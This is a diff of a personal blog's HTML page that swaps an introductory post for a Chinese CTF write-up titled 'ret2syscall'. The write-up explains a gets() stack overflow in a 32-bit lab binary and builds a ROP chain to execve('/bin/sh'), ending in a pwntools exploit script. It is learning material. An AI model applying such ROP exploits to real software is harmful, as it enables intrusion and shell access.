@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="magnesium">
   <meta name="keywords" content="">
-  <title>+Mg的碎碎念 - +mg&#39;s blog</title>
+  <title>ret2syscall - +mg&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -150,7 +150,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.1)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="+Mg的碎碎念">
+            <span class="h2" id="subtitle" title="ret2syscall">
               
             </span>
 
@@ -160,8 +160,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-01-01 13:02" pubdate>
-        2021年1月1日 下午
+      <time datetime="2021-03-10 14:38" pubdate>
+        2021年3月10日 下午
       </time>
     </span>
   
@@ -172,7 +172,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      319 字
+      404 字
     </span>
   
 
@@ -182,7 +182,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      5
        分钟
     </span>
   
@@ -212,18 +212,26 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">+Mg的碎碎念</h1>
+            <h1 style="display: none">ret2syscall</h1>
             
             <div class="markdown-body">
-              <h2 id="一点感想"><a href="#一点感想" class="headerlink" title="一点感想"></a>一点感想</h2><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><p>学习过程中的琐碎知识点与方法，时时值得记录，记录下自己的学习轨迹，以求温故知新，不记下来的话，回望来时的路似乎有点空荡</p>
-<h3 id="02"><a href="#02" class="headerlink" title="02"></a>02</h3><p>可能要学很多很多不同领域的知识，大概方便自己区分一下（？）</p>
-<h3 id="03"><a href="#03" class="headerlink" title="03"></a>03</h3><p>会把学到的大大小小的知识点、解决的大大小小的问题、做过的大大小小的题都记下来，大概是个日记本</p>
-<h3 id="04"><a href="#04" class="headerlink" title="04"></a>04</h3><p>blog模板有一些功能还不太会用，接下来会慢慢学习<br>该blog采用模板：fluid搭建，后续会加一些实用（花里胡哨）的功能，比如评论区和音乐播放器和友链（如果有hxd愿意的话）</p>
-<h3 id="05"><a href="#05" class="headerlink" title="05"></a>05</h3><p>用国内网络访问会有亿点点慢，后期可能会换成私人服务器，如果有奇怪的bug存在，pls联系<a href="mailto:&#49;&#55;&#53;&#54;&#x35;&#x36;&#x37;&#x38;&#x31;&#52;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#109;">&#49;&#55;&#53;&#54;&#x35;&#x36;&#x37;&#x38;&#x31;&#52;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#109;</a></p>
-<h3 id="06"><a href="#06" class="headerlink" title="06"></a>06</h3><p>关于页有我的github，可能后面会慢慢开始用，但现在是一片荒地（</p>
-<h3 id="07"><a href="#07" class="headerlink" title="07"></a>07</h3><p>还没有决定方向，大概突然想学什么就学什么</p>
-<h3 id="08"><a href="#08" class="headerlink" title="08"></a>08</h3><p>大概是要告诫自己：万丈高楼平地起，勿在浮沙筑高台</p>
-
+              <p>打算跟着ctf wiki一题一题地学起，手动实践的时候还是能学到很多东西的。</p>
+<p>首先是checksec，是32位程序，开启了栈堆不可执行保护，因此不能用shellcode来提权。</p>
+<p><img src="1.png" srcset="/img/loading.gif"></p>
+<p>打开ida查看源代码，存在gets函数栈溢出漏洞</p>
+<p><img src="2.png" srcset="/img/loading.gif"></p>
+<p>然后再搜索一下system和/bin/sh，发现只有/bin/sh</p>
+<p><img src="3.png" srcset="/img/loading.gif"></p>
+<p>那么可以通过gadgets构建ROP链，实现系统调用，具体资料如下</p>
+<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></p>
+<p>简而言之就是需要利用gadgets实现函数execve(“/bin/sh”,NULL,NULL)，那么应该往eax存入0xb（系统调用号），往ebx存入“/bin/sh”（通过pop ebx实现），往ecx与edx中存入0。尽管这是32位程序，函数调用参数通常是使用栈上数据，但在使用系统调用时，需要修改寄存器达到系统调用目的。</p>
+<p>那么接下来就要寻找合适的gadgets。</p>
+<p><img src="4.png" srcset="/img/loading.gif"></p>
+<p>用图上两个地方的gadgets就可以实现寄存器的修改。</p>
+<p>接下来寻找/bin/sh和int 80h的地址，就可以将/bin/sh pop入ebx中，并在最后调用int80h。</p>
+<p><img src="5.png" srcset="/img/loading.gif"></p>
+<p>那么全部地址都凑齐了，就可以写exp了</p>
+<figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><span class="hljs-variable">p</span> = <span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./rop&#x27;</span>)</span><br><span class="hljs-variable">context.log_level</span> = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-variable">gdb.attach</span>(<span class="hljs-variable">p</span>)<br><br><span class="hljs-variable">binsh</span> = <span class="hljs-number">0</span><span class="hljs-variable">x080be408</span><br><span class="hljs-variable">int80</span> = <span class="hljs-number">0</span><span class="hljs-variable">x08049421</span><br><span class="hljs-variable">edx_ecx_ebx_ret</span> = <span class="hljs-number">0</span><span class="hljs-variable">x0806eb90</span><br><span class="hljs-variable">eax_ret</span> = <span class="hljs-number">0</span><span class="hljs-variable">x080bb196</span>    <span class="hljs-comment">//通过ROPgadget获取到的信息</span><br><br><span class="hljs-variable">p.recvuntil</span>(<span class="hljs-string">&#x27;What do you plan to do?\n&#x27;</span>)<br><span class="hljs-variable">payload</span> = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span> + <span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">eax_ret</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span><span class="hljs-variable">xb</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">edx_ecx_ebx_ret</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">binsh</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">int80</span>)</span><br><span class="hljs-comment">//填充垃圾数据--系统调用号pop入eax并返回--exceve函数参数pop入对应寄存器并返回--调用int 80h</span><br><br><span class="hljs-variable">p.send</span>(<span class="hljs-variable">payload</span>)<br><br><span class="hljs-variable">p.interactive</span>()<br></code></pre></div></td></tr></table></figure>
             </div>
             <hr>
             <div>
@@ -232,7 +240,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E9%9A%8F%E8%AE%B0/">随记</a>
+                      <a class="hover-with-bg" href="/categories/pwn/">pwn</a>
                     
                   </div>
                 
@@ -246,15 +254,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/01/14/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">汇编语言--学习笔记</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2021/03/03/HGAME%E5%AF%92%E5%81%87/">
+                        <span class="hidden-mobile">2021-学期小结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
